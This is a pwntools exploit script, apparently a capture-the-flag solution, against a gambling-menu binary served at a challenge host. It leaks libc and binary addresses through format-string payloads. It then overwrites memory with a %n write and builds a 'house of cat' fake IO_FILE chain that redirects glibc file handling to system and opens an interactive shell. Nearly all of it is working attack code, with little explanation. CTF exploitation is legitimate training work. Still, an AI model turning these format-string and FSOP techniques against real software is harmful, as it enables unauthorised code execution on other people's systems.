from pwn import *
from ctypes import CDLL
from os import path
import sys

# =========================================================
#                         SETUP
# =========================================================
exe = path.join(path.dirname(__file__) or '.', 'chal_patched')
elf =context.binary = ELF(exe, checksec=False)
libc = ELF(path.join(path.dirname(__file__) or '.', 'libc.so.6'), checksec=False)
HOST = "remote.infoseciitr.in"
PORT = 8004
context.log_level = 'debug'
context.bits = 64
context.arch = 'amd64'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]

gdbscript = '''
init-pwndbg
c
'''

def initialize(argv=[]):
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv)

# helper io wrappers (match style in exploit.py)
io = None
s       = lambda data               : io.send(data)
sa      = lambda x, y               : io.sendafter(x, y)
sl      = lambda data               : io.sendline(data)
sla     = lambda x, y               : io.sendlineafter(x, y)
se      = lambda data               : str(data).encode()
ru      = lambda delims, drop=True  : io.recvuntil(delims, drop)


# =========================================================
#                         MENU HELPERS
# =========================================================

def menu(choice):
    sla(b'> ', str(choice).encode())

def login(uid, username, coins):
    menu(1)
    sla(b': ', str(uid).encode())
    sla(b': ', username)
    sla(b': ', str(coins).encode())

def place_bet(uid, bet_amount):
    menu(2)
    sla(b': ', str(uid).encode())
    sla(b': ', bet_amount)

def gamble(uid):
    menu(3)
    sla(b': ', str(uid).encode())
    for i in range(5):
        ru(b'gamble...')
        sl(b'')

def debug():
    global gdbscript, pid
    if ((not args.REMOTE and not args.GDB) or (args.QEMU and args.GDB)):
        if args.QEMU:
            open_split_tmux(["gdb"] + [a for c in filter(None, gdbscript.strip().splitlines()) for a in ["-ex", c.strip()]])
        elif args.DOCKER:
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe="chal")
        else:
            attach(io, gdbscript=gdbscript)


if __name__ == '__main__':
    io = initialize()

    # replicate original exploit logic, using `io` and helper functions
    login(0, b'abc', 123)
    place_bet(0, (b'A' * 10) + b'%33$p')
    libc_leak = int(io.recv(14).decode(), 16)
    libc.address = libc_leak - libc.sym['__libc_start_call_main'] - 0x7a
    log.info(f'libc: 0x{libc.address:x}')

    login(1, b'def', 123)
    place_bet(1, (b'A' * 10) + b'%37$p')
    main = int(io.recv(14).decode(), 16)
    elf.address = main - elf.sym['main']
    log.info(f'binary: 0x{elf.address:x}')

    login(2, b'xyz', 456)
    debug()
    log.info("Target: ", hex(elf.address + 16784))
    pause()
    place_bet(2, (b'AA' + p64(elf.address + 16784)) + b'e%9$n')
    pause()
    login(3, b'tmkc', (libc.sym['_IO_2_1_stdin_'] + 0x30) // 8)
    log.info("Stdin + 0x30 addr: ", hex(libc.sym['_IO_2_1_stdin_'] + 0x30))
    pause()
    place_bet(3, b'e')
    gamble(3)
    pause()
    IO_list_all = libc.address + 0x2044c0
    # house of cat exploit chain template
    fake_io_addr = libc.address + 0x2043a8
    fake_IO_FILE = b"\xd0\x06;sh;\x00\x00"
    fake_IO_FILE += p64(0) * 6
    fake_IO_FILE += p64(0x7777)
    fake_IO_FILE += p64(1) + p64(2)
    fake_IO_FILE += p64(fake_io_addr + 0xB0)
    fake_IO_FILE += p64(libc.address + 0x58750)  # call addr(call setcontext/system)
    fake_IO_FILE = fake_IO_FILE.ljust(0x68, b"\x00")
    fake_IO_FILE += p64(0)
    fake_IO_FILE = fake_IO_FILE.ljust(0x88, b"\x00")
    fake_IO_FILE += p64(libc.address+0x204140)
    fake_IO_FILE = fake_IO_FILE.ljust(0xA0, b"\x00")
    fake_IO_FILE += p64(fake_io_addr + 0x30)
    fake_IO_FILE = fake_IO_FILE.ljust(0xC0, b"\x00")
    fake_IO_FILE += p64(1)  # mode=1
    fake_IO_FILE = fake_IO_FILE.ljust(0xD8, b"\x00")
    fake_IO_FILE += p64(
        libc.address + 0x202228 + 0x30
    )  # vtable=IO_wfile_jumps+0x10  (vtable = IO_wfile_jumps + 0x30 for FSOP）
    fake_IO_FILE += p64(0) * 6
    fake_IO_FILE += p64(fake_io_addr + 0x40)
    print("Len", len(fake_IO_FILE))
    pause()
    io.sendlineafter(b'> ', p64(libc.address+0x203900)*3+p64(IO_list_all-8-len(fake_IO_FILE))+p64(IO_list_all+8)+p64(0))
    io.send(p64(0xDEADBEEF)+fake_IO_FILE+p64(fake_io_addr))

    # NOTE: after it prompts you, type "4" to exit and get shell

    io.interactive()
